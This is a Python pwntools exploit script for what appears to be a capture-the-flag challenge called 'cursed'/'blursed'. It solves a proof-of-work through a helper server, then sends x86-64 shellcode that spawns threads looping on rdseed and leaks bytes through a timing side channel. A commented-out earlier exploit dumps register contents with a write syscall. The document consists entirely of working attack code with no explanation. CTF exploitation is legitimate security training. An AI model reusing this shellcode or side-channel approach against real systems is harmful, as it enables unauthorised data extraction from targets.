from pwn import *
from pyblake2 import blake2b
from binascii import unhexlify

g_local=0
context(log_level='info', arch='amd64')
if g_local:
	sh = process("./cursed_nopow")
	# gdb.attach(sh, 'c')
else:
	# sh = remote("cursed.challenges.ooo", 29696)
	sh = remote("blursed.challenges.ooo", 29696)
def recv_all(sh, size):
	i = 0
	ret = ""
	while i < size:
		tmp = sh.recv(size - i)
		ret += tmp
		i += len(tmp)
	return ret

head = sh.recv(0x10)
assert len(head) == 0x10
if g_local:
	sh.send('A'*0x30)
else:
	p = remote("xxxxxx", 2333)
	p.send(head)
	# p.interactive()
	data = recv_all(p, 0x80)
	assert len(data) == 0x80
	data = unhexlify(data[0x20:])
	p.close()
	sh.send(data)
	# for i in xrange(0, 0x100000000):
	# 	data = p32(i).ljust(0x30, b'A')
	# 	r = blake2b(head + data, digest_size=16).digest()
	# 	if r[0] == '\x00' and r[1] == '\x00' and r[2] == '\x00':
	# 		sh.send(data)
	# 		break

sc = asm("""
call next
next: pop rbx

mov rbp, %s
clones:
	mov rdi,0x18900
	mov rsi,rsp
	sub rsi,0x2000
	mov rax,SYS_clone
	syscall
	test rax, rax
	jz rdseed_loop
	dec rbp
	test rbp,rbp
jnz clones

add rbx, -5+0xff8
mov rsi, rbx
sub rsi, 8
mov rax, SYS_write
mov rdi, 1
mov rdx, 1

mov rcx,0x100
wait0: loop wait0


crack_loop:
	mov r8,1
	byte_loop:
		mov qword ptr [rbx], r8
		mov rcx,%s
		wait: loop wait
		cmp qword ptr [rbx], 0
		jnz byte_loop_end
		mov [rsi], r8
		syscall
		jmp crack_loop
		byte_loop_end:
		inc r8
		cmp r8, 0xff
		jbe byte_loop

jmp crack_loop

rdseed_loop:
rdseed rax
jmp rdseed_loop

	""" % (hex(100), hex(0x100)))

# -------- phseudo code --------
# while True:
# 	for i in [1...255]
# 		[rbx] = i
# 		wait
# 		if [rbx] == 0:
# 			print i
# 			break

sc = sc.ljust(0x1000, '\x00')


sh.send(sc)

sh.interactive()


# ------------------ exp for cursed ------------------
# sc = asm("""
# call next
# next: pop rsi
# mov rdi,rsi
# add rdi,0x800-5

# mov rbx,rsp
# sub rbx,0x10c8

# mov qword ptr [rsi-5+0xff8], 1

# loop:
# mov [rbx],rdi
# jmp loop

# 	""")

# sc = sc.ljust(0x800, '\xcc')

# sc += asm("""
# call next
# next: pop rsi
# add rsi,0x100-5
# movups [rsi],xmm0
# movups [rsi+0x10],xmm1
# movups [rsi+0x20],xmm2
# movups [rsi+0x30],xmm3
# movups [rsi+0x40],xmm4
# movups [rsi+0x50],xmm5
# movups [rsi+0x60],xmm6
# movups [rsi+0x70],xmm7
# mov rdi,1
# mov rdx,0x40
# mov rax,SYS_write
# syscall
# 	""")

# sc = sc.ljust(0x1000, '\x00')
